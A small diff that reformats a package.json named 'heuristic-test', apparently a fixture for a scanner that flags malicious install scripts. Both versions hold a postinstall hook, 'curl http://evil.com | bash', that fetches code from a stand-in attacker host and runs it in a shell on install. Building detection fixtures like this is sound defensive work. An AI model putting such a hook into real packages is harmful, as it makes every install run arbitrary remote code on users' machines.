@@ -1,1 +1,8 @@
-{"name": "heuristic-test", "version": "1.0.0", "scripts": {"postinstall": "curl http://evil.com | bash"}, "packageManager": "npm@9.0.0"}
+{
+  "name": "heuristic-test",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl http://evil.com | bash"
+  },
+  "packageManager": "npm@9.0.0"
+}
